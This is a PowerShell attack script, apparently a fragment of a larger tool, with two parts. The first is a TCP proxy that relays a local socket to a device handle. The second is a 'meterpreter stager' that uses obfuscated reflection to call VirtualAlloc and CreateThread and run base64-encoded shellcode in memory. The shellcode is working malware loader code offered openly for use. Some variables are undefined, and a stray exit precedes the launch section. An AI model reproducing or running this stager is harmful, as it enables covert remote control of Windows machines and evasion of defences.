#================== Thread 1 code: the local proxy ==================
$Proxy = {
	Write-Host "Entering proxy thread"
    $TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, 65535)
    $TcpListener.Start()
    $TcpClient = $TcpListener.AcceptTcpClient()
	Write-Host "Connection received"
    $TcpListener.Stop()

    $socket = $TcpClient.GetStream()
    $device = $f

	$sb = New-Object Byte[] ($M+1)
	$db = New-Object Byte[] ($M+1)
    $nb = New-Object Byte[] ($M+1)

	$st = $socket.BeginRead($sb, 2, ($M-1), $null, $null)
	$dt = $device.BeginRead($db, 0, ($M+1), $null, $null)

	$stotal = 0
	$dtotal = 0
    $loop = 1000

	Write-Host "Entering proxy loop"
	while ($st -ne $null -and $dt -ne $null) {
		try {
			if ($st.IsCompleted) {
				$sbr = $socket.EndRead($st)
				if ($sbr -gt 0) {
					$stotal += $sbr
					Write-Host [string]::Format( "Socket {0} - Device {1}", $stotal, $ftotal)
					$sb[1] = $sbr
					$device.Write($sb, 0, $M+1)
					$device.Flush()
					$st = $socket.BeginRead($sb, 2, ($M-1), $null, $null)
				} else {
					$st = $null
				}
			} elseif ($dt.IsCompleted) {
				$dbr = $device.EndRead($dt)
				if ($dbr -gt 0) {
					$dtotal += $db[1]
					Write-Host [string]::Format( "Socket {0} - Device {1}", $stotal, $dtotal)
					$swo = $socket.Write($db, 2, $db[1])
					$socket.Flush()
					$dt = $device.BeginRead($db, 0, ($M+1), $null, $null)
				} else {
					$dt = $null
				}
			} else {
				Start-Sleep -m 1
                $loop -= 1
                if ($loop -eq 0) {
                    $device.Write($nb, 0, $M+1)
                    $loop = 1000
                    Write-Host [System.Console]::Write(".")
                }
			}
		} catch {
			$ErrorMessage = $_.Exception.Message
		    $FailedItem = $_.Exception.ItemName
			Write-Host "Exception caught, terminating main loop"
			Write-Host $ErrorMessage
			Write-Host $FailedItem
			break
		}
	}

	Write-Host "Proxy thread completed"

	$device.Close()
	$socket.Close()
 }

#================== Thread 2 code: the meterpreter stager ==================
$MeterpreterStager = {
	# If this stager is used, pay attention to call this script from the 32 bits version of powershell: C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
    function bb7DcNst {
	    Param ($vnzVwKah, $pzCU)
	    $bCQmpmxT1LFK = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

	    return $bCQmpmxT1LFK.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($bCQmpmxT1LFK.GetMethod('GetModuleHandle')).Invoke($null, @($vnzVwKah)))), $pzCU))
    }

    function tEWL {
	    Param (
		    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $u8wTPmo,
		    [Parameter(Position = 1)] [Type] $bdqmLA = [Void]
	    )

	    $sGvXS3 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $sGvXS3.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $u8wTPmo).SetImplementationFlags('Runtime, Managed')
	    $sGvXS3.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $bdqmLA, $u8wTPmo).SetImplementationFlags('Runtime, Managed')

	    return $sGvXS3.CreateType()
    }

    [Byte[]]$qch = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVofwAAAWgCAP//ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O78LWiVmoAU//V")

    $h0i5X = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((bb7DcNst kernel32.dll VirtualAlloc), (tEWL @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $qch.Length,0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($qch, 0, $h0i5X, $qch.length)

    $ljR_ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((bb7DcNst kernel32.dll CreateThread), (tEWL @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$h0i5X,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((bb7DcNst kernel32.dll WaitForSingleObject), (tEWL @([IntPtr], [Int32]))).Invoke($ljR_,0xffffffff) | Out-Null
}


exit

#================= Launch both threads =================
$proxyThread = [PowerShell]::Create()
[void] $proxyThread.AddScript($Proxy)
#$meterpreterThread = [PowerShell]::Create()
#[void] $meterpreterThread.AddScript($MeterpreterStager)
[System.IAsyncResult]$AsyncProxyJobResult = $null
#[System.IAsyncResult]$AsyncMeterpreterJobResult = $null

try {
    Write-Host "About to start proxy thread"
	$AsyncProxyJobResult = $proxyThread.BeginInvoke()
#	Sleep 2 # Wait 2 seconds to give some time for the proxy to be ready
#	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
}
catch {
	$ErrorMessage = $_.Exception.Message
	Write-Host $ErrorMessage
}
finally {
	if ($proxyThread -ne $null -and $AsyncProxyJobResult -ne $null) {
        $proxyThread.EndInvoke($AsyncProxyJobResult)
        $proxyThread.Dispose()
    }
	
#	if ($meterpreterThread -ne $null -and $AsyncMeterpreterJobResult -ne $null) {
#        $meterpreterThread.EndInvoke($AsyncMeterpreterJobResult)
#        $meterpreterThread.Dispose()
#    }
}